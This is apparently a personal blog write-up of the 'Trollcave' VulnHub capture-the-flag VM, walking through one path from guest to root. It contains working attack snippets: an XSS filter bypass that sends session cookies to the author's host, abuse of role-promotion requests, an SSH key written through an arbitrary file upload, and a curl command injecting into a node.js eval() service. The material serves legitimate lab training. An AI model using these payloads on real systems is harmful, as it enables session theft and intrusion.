---
title: Vulnerable VM Writeups: TrollCave
description: Writing up my experience with a vulnerable VM.
---

# Vulnerable VM Writeups: TrollCave

Trollcave is a VM available from [VulnHub](https://www.vulnhub.com/entry/trollcave-12,230/) - a  "vulnerable VM, in the tradition of Vulnhub and infosec wargames in general. You start with a virtual machine which you know nothing about – no usernames, no passwords, just what you can see on the network."

As with many traditional wargaming VMs, your objective is simple: gain access to the root account and retrieve a flag to prove you did it. Although it didn't offer a great many surprises, I found it pretty enjoyable. What follows is a write-up of my experience of trying to exploit this VM. It's not exhaustive documentation - from my understanding, there are more than a couple ways to go about exploiting this VM.

## Getting Started

After importing and setting up the VM on a host-only network and confirming that it had obtained an IP address properly, I was ready to begin poking at it. Knowing nothing about the system or what I was in for, I started with a simple netdiscover to find it on the local network, followed by a quick NMap scan to see which ports are open.

The results were pretty simple: two services accessible to the outside world on ports 22 and 80. After examining the OpenSSH running on port 22 and concluding that I wouldn't find an easy way in there, I proceeded to the webserver. It's a fairly simple community blogging platform running Rails, complete with the kind of humour we've come to expect from CTF challenges ("God himself cannot hack this website. - dragon, site admin"). There's a lot going on here, but very little is accessible without an account - which is problematic, since registration seems to be closed. The first step, then, is to get our hands on one.

## Escalating from Guest User

This challenge relies heavily on its hints, especially in the web app exploitation phase. Pretty much every stage includes some kind of hint in the form of a blog post. Some of them were red herrings (unless I missed something), but I'll cover that later. The interesting tidbit that leads you to your first win is a blog post about password resets by "coderguy", the site developer. He doesn't tell you exactly where to look for the password reset functionality - and there's no links to it anywhere. What he does say, however, is that there is a `password_resets` resource in use.

A little bit of intuition or an understanding of the way Ruby on Rails resources are set up is required here. The resource he's referring to is at `/password_resets/new`. Here we'll find a lovely unauthenticated form that lets us reset the password of any regular user - moderators and admins are out of our grasp, but this was enough for me to reset the password of 'xer', one of the regular members on the site.

## Escalating from Regular Member

While I was doing this challenge, I was very focussed on a particular comment made by King, the site superadmin:

`I promise to read every blog restricted to my access level, no matter how creepy. `

See, every user has the ability to create blogs, and every blog has an access level. Regular users only have access levels 0 and 1; which are "everyone can see it" and "only members can see it", respectively. King has an access level of 5, but a regular user can't create a blog at that level - not even by fiddling with the POST parameters, as I found out. In the end, making a level 5 blog and performing a client-side attack wasn't the answer, but it kept me going for a good while.

Either way, the next step for me was to get one of those fancy moderator accounts. Besides King, one other user had dropped a hint about monitoring the website - "cooldude89", a Moderator user. He had created a thread about politics and religion, and promised to constantly watch it to make sure no trolls derail the debate. Taking this as an invitation for a client side attack, I set about searching for XSS.

Although there is a rudimentary WAF in place, circumventing it didn't take much. The `<script>` tag is filtered out of any post or comment, but all you need to do is include an attribute (i.e. `<script id=test>`) and it will go through. After some tinkering, I deduced that the session cookie is not protected in any way, and that stealing it will let you hijack a user's session - even if they click the logout button. To that end, I crafted the following XSS injection:

`<SCRIPT id=test>document.write('<img src="http://192.168.56.1/collect.gif?cookie=' + document.cookie + '" />')</SCRIPT>`

All I needed on the backend was a simple little Python script to collect the cookies being sent to my IP address. My assumption was correct - the page was being periodically accessed by cooldude89, and I shortly harvested his cookie and used it to log in as him. Now as moderator, I was able to set my sights on a higher prize.

## Escalating from Moderator

Above the role of moderator, there were two roles I didn't yet have access to: admin and superadmin. Once again, the blogs provided a valuable hint. This time, it came in the form of a blog post visible only to moderators that documents a "promote" functionality. Basically, any moderator can "promote" any regular member into a moderator. This is handy for escalating xer into a mod so I don't have to modify a cookie every time I want to log in, but it doesn't help me get to admin... or does it?

When you promote someone to moderator, a POST request is made to a URI that looks something like `/users/12/mod`. After you've promoted them, the "mod" button goes away. This client-side control is intended to stop you from promoting someone who has already been promoted - but what if you just replay the POST request? By making a request to promote someone who is already a moderator, it is possible to promote them into an admin. The only catch is that you can't do it to yourself - so I promoted xer into a mod, then an admin.

## Escalating from Admin

Only one hurdle remains: the superadmin account. There is only one superadmin: King. As before, Trollcave has a hint for us. I had suspected that the file upload functionality - which is disabled - would eventually be how I got code execution. This was all but confirmed by an admin-only post which indicated that it was disabled due to "security concerns", and that only the superadmin could enable it. Another admin-only blog post informed us that King has quit to "find himself", and that dragon has taken his account - so we need to escalate laterally to his account. Whoever has King has access to the file upload functionality, which is the way in.

So, we need to get from one admin account to another. Luckily, the client-side validation on the "promote" functionality comes to the rescue again. There is an "unmod" button which removes admin or moderator status, and can be abused in a similar way to the "mod" button. Using this, I was able to demote dragon down to a regular user, then reset his password. I could have promoted him back up to admin, but it wasn't necessary in the end - his "access" to the King account comes in the form of a message in his inbox containing King's password.

Armed with the password, I was able to log in to King.

## Getting Shell Access

Obviously, the first thing I did as King was to re-enable the file upload functionality. The second was to look at the blogs for any new hints. Unsurprisingly, I found one:

`hey man, if i'm going to be doing much more work on the site i'm really going to need sudo access. also i don't know how good an idea it is for me to be using the rails user interactively, maybe we oughta separate that`

This could be useful in the future, but first we need to see just what we can do with the file upload function. As it turns out, it's pretty trivial to exploit - you can specify any path accessible to the web application, and your file will be uploaded there. So if you enter `/var/www/public/test.txt`, a file will be written there. You don't even need the usual directory traversal tricks. Trying to write a file to somewhere you don't have access to simply results in a generic rails 500 error.

Once again, some intuition is required. We know there is a `rails` user, and we can deduce that's who the webserver is running as. So getting shell access is as simple as writing our public key to `/home/rails/.ssh/authorized_keys`. The only difficult part is guessing that it's possible to do that in the first place. There may be other routes to getting generic code execution - after all, generic file write is a powerful tool.

Once I had uploaded my public key to the server, I was able to SSH in as the `rails` user.

## Escalating to Root

With SSH access, we are in the endgame. All that is left is to poke around until we find something that will allow us to escalate our privileges. The fact that all the directories in `/home/` are world-readable raised immediate red flags. Most of the home directories are empty, but the `king` user has an interesting file called `calc.js`. This is a node.js server that runs locally on port 8888 and performs simple math using the eval() function. To make things even easier, the `child_process` module of node.js is already imported - giving us access to the exec() command. 

Specifically, the code we're interested in looks like this:

```
function calc(pathname, request, query, response)
{
        sum = query.split('=')[1];
        console.log(sum)
        response.writeHead(200, {"Content-Type": "text/plain"});

        response.end(eval(sum).toString());
}
```

It's very simple: whatever gets passed as a GET parameter is fed directly into eval(). If we can get `king` to run this file, we can probably leverage it for code execution.

As it turned out, we don't need to "get `king` to run this file" - it's already running. A simple `netstat -antp` revealed that port 8888 is already listening; it's just not accessible to the outside world. That's not a problem for us, though, since we already have SSH access to the server. I confirmed it was working from the `rails` account with a simple curl command:

`curl http://127.0.0.1:8888/calc?sum=5-5`

This returned 0, as we would expect it to. All that is left is to craft an exploit. For whatever reason, I found that it didn't like any spaces in its input, but this was easy enough to circumvent:

```
$ echo "touch /tmp/test.txt" > /tmp/king.sh
$ chmod +x /tmp/king.sh
$ curl "http://127.0.0.1:8888/calc?sum=exec('/tmp/king.sh')"
```

Checking the contents of `/tmp` confirmed that my code had executed. I was able to use `king.sh` to get my public key copied into `/home/king/.ssh/authorized_keys`. This allowed me to login as `king`. Since `king` has passwordless sudo access, this directly enabled me to escalate to root.

Here is the contents of the flag file, for proof:

>c0db34ce8adaa7c07d064cc1697e3d7cb8aec9d5a0c4809d5a0c4809b6be23044d15379c5

## Afterword

The style of this vulnerable VM is very similar to many of the medium-difficulty labs I encountered while doing the OSCP. Although it followed a somewhat predictable pattern and some of the difficult was down to, for example, an obscure naming convention in the password reset functionality, I nonetheless found that it was entertaining and engaging. On a technical level, the VM was also pretty stable - despite mucking around quite a bit with blog and user creation while experimenting, I didn't have any trouble with the web application or the VM itself. 

All in all, the challenge took me around 4 hours to complete.
